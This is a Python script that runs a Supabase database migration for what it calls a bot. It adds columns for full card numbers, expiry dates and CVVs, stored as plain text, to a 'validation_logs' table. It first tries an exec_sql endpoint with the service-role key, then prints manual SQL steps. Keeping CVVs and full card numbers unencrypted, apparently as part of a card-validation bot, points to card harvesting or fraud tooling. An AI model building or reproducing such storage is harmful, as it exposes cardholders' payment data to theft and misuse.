"""
Auto-execute migration using Supabase postgresmeta internal API.
"""

import httpx
from config import config


def run_migration_auto():
    """Try to add columns using Supabase's internal API."""
    supabase_url = config.supabase_url
    service_key = config.supabase_service_role_key
    
    print("=" * 70)
    print("Attempting automatic migration...")
    print("=" * 70)
    print()
    
    # Extract the project ref from the URL
    project_ref = supabase_url.split("//")[1].split(".")[0]
    
    # Try the internal postgresmeta endpoint
    # This might not work if not enabled, but worth trying
    meta_url = f"https://{project_ref}.supabase.co/rest/v1/rpc/exec_sql"
    
    sql = """
    ALTER TABLE validation_logs 
    ADD COLUMN IF NOT EXISTS full_card_number TEXT,
    ADD COLUMN IF NOT EXISTS exp_month TEXT,
    ADD COLUMN IF NOT EXISTS exp_year TEXT,
    ADD COLUMN IF NOT EXISTS cvv TEXT;
    """
    
    headers = {
        "apikey": service_key,
        "Authorization": f"Bearer {service_key}",
        "Content-Type": "application/json",
    }
    
    try:
        response = httpx.post(
            meta_url,
            headers=headers,
            json={"sql": sql},
            timeout=15,
        )
        
        if response.status_code == 200:
            print("✓ Migration successful!")
            print("Columns added to validation_logs table.")
            return True
        else:
            print(f"✗ Automatic migration failed: {response.status_code}")
            print(f"Error: {response.text[:200]}")
            print()
            return False
    except Exception as e:
        print(f"✗ Migration failed: {e}")
        print()
        return False


def show_manual_instructions():
    """Show manual migration instructions."""
    print()
    print("=" * 70)
    print("MANUAL MIGRATION REQUIRED")
    print("=" * 70)
    print()
    print("Please follow these steps:")
    print()
    print("1. Open your browser and go to:")
    print("   https://uqrtjsyxtfmtflvasuhm.supabase.co")
    print()
    print("2. Click on 'SQL Editor' in the left sidebar")
    print()
    print("3. Click 'New query'")
    print()
    print("4. Copy and paste this SQL:")
    print()
    print("-" * 70)
    print("""
-- Add full card data columns to validation_logs table
ALTER TABLE validation_logs 
ADD COLUMN IF NOT EXISTS full_card_number TEXT,
ADD COLUMN IF NOT EXISTS exp_month TEXT,
ADD COLUMN IF NOT EXISTS exp_year TEXT,
ADD COLUMN IF NOT EXISTS cvv TEXT;

-- Verify columns were added
SELECT column_name, data_type 
FROM information_schema.columns 
WHERE table_name = 'validation_logs' 
  AND column_name IN ('full_card_number', 'exp_month', 'exp_year', 'cvv')
ORDER BY column_name;
""".strip())
    print("-" * 70)
    print()
    print("5. Click 'Run' or press Ctrl+Enter")
    print()
    print("6. You should see 4 rows showing the new columns")
    print()
    print("7. Restart the bot after migration is complete")
    print("=" * 70)


if __name__ == "__main__":
    success = run_migration_auto()
    if not success:
        show_manual_instructions()
        print()
        input("Press Enter to exit after copying the SQL...")
